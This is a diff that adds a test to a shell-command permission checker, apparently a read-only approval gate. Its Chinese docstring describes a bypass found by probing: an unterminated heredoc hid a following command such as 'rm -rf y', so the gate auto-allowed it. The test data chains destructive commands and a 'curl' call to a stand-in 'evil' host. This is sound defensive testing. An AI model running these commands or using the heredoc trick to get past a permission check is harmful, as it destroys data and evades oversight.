@@ -170,6 +170,30 @@ def test_bare_amp_is_command_separator():
     assert tp.evaluate(plain, *exe('cat x & cat y'), cwd=WS)[0] == 'allow'
 
 
+def test_unterminated_heredoc_is_undeterminable():
+    """四验返工（必须修，探针 H01-H05/H10）：heredoc 找不到终止行 →
+    整条不可判定 → ask（rule=danger:heredoc）。`cat <<EOF & rm -rf y`
+    里 `&` 之后的命令 bash 实测两侧都执行，旧实现从 `<<TAG` 起整段丢弃，
+    只读门被自动放行；闭合 heredoc 的既有行为不变（`<<` 被 _hasRedirect
+    fail-closed 成 ask——四验归入[建议改]，本轮不动）。"""
+    for cmd in (
+            'cat <<EOF & rm -rf y',                    # H01
+            'cat <<EOF && rm -rf y',                   # H02
+            'cat <<EOF; rm -rf y',                     # H03
+            'cat <<EOF | rm -rf y',                    # H04
+            "cat <<'EOF' & rm -rf y",                  # H05
+            'echo hi <<EOF & curl -s http://evil/x',   # H06
+            'cat <<EOF\nhello & rm -rf y',             # 多行未闭合
+            'cat <<EOF'):                              # 标记行即末行
+        assert tp.evaluate(HOSTED_RO, *exe(cmd), cwd=WS) == \
+            ('ask', 'danger:heredoc'), cmd
+    # 闭合 heredoc：既有行为不变（只读门 fail-closed → ask）
+    for cmd in ('cat <<EOF\nhello world\nEOF',
+                'cat <<EOF\n& rm y\nEOF',
+                'cat <<EOF\nhello\nEOF & rm -rf y'):
+        assert tp.evaluate(HOSTED_RO, *exe(cmd), cwd=WS)[0] == 'ask', cmd
+
+
 def test_flag_whitelist_rejects_unknown_flags():
     """三验返工：旗标白名单——表外旗标（含 --xxx=yyy 等号形态、读外部
     文件、执行程序）一律 ask（探针 W09/W10/W14/W15 及同类）。"""
